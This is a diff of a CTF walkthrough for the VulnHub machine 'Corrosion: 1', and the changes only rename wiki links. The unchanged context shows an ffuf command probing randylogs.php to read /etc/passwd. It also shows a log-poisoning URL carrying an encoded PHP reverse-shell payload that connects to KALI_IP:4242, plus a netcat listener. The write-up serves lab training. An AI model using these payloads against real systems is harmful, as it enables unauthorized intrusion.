@@ -1,6 +1,6 @@
 [https://www.vulnhub.com/entry/corrosion-1,730/](https://www.vulnhub.com/entry/corrosion-1,730/?ref=rootandbeer.com)
 
-The "Corrosion: 1" CTF challenge on VulnHub, though labeled as Easy, presented multiple layers of complexity, including service enumeration, [[Log Poisoning]], and [[Path Abuse]] to achieve root access. The initial foothold was gained through discovering and exploiting a vulnerable PHP script (randylogs.php) using [[Log Poisoning]] via an SFTP login. This allowed for remote command execution, leading to a [[Reverse Shell]]. Privilege escalation involved identifying a world-readable backup file, cracking a password-protected ZIP file, and leveraging a [[Path Abuse]] vulnerability in a custom script to execute arbitrary commands as root. The challenge concluded with obtaining the root flag, showcasing a combination of enumeration, scripting, and privilege escalation techniques.
+The "Corrosion: 1" CTF challenge on VulnHub, though labeled as Easy, presented multiple layers of complexity, including service enumeration, [[Log Poisoning]], and [[Path Abuse]] to achieve root access. The initial foothold was gained through discovering and exploiting a vulnerable PHP script (randylogs.php) using [[Log Poisoning]] via an SFTP login. This allowed for remote command execution, leading to a [[_MOCS/Reverse Shells]]. Privilege escalation involved identifying a world-readable backup file, cracking a password-protected ZIP file, and leveraging a [[Path Abuse]] vulnerability in a custom script to execute arbitrary commands as root. The challenge concluded with obtaining the root flag, showcasing a combination of enumeration, scripting, and privilege escalation techniques.
 
 **Run *[[Nmap]]* -A scan to discover ports 22 & 80 are open:**
 
@@ -96,7 +96,7 @@ DOWNLOADED: 9224 - FOUND: 2
 
 **Browse to *blog-post/archives/* to discover "randylogs.php".**
 
-**Use [[Ffuf]] to discover the "file" parameter for *randylogs.php*:**
+**Use [[FFuF]] to discover the "file" parameter for *randylogs.php*:**
 
 ```bash
 └─$ ffuf -w /usr/share/wordlists/dirb/common.txt -fs 0 -u http://192.168.5.119/blog-post/archives/randylogs.php?FUZZ=/etc/passwd 
@@ -168,7 +168,7 @@ Aug  7 19:19:22 corrosion sshd[3498]: Connection closed by invalid user uid=33(w
 
 > http://192.168.5.119/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22KALI\_IP%22%2C4242%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 
-**Once [[Reverse Shell]] is connected using *netcat*, get a better interactive shell:**
+**Once [[_MOCS/Reverse Shells]] is connected using *netcat*, get a better interactive shell:**
 
 ```bash
 listening on [any] 4242 ...
@@ -186,7 +186,7 @@ shopt -q login_shell && echo 'login' || echo 'not-login'
 >[!Optional] 
 >Use the [[better shell]] upgrade from netcat with magic method to get a python TTY to a fully interactive shell with tab complete, bash history, working left/right arrow keys, CTRL+C, etc:
 
-**Move to */tmp* directory for write access so you can download and run *[[Linpeas]]* to discover a world-readable backup file at */var/backups/user\_backup.zip.*:**
+**Move to */tmp* directory for write access so you can download and run *[[LinPEAS]]* to discover a world-readable backup file at */var/backups/user\_backup.zip.*:**
 
 ```bash
 www-data@corrosion:/var/www/html/blog-post/archives$ cd /tmp
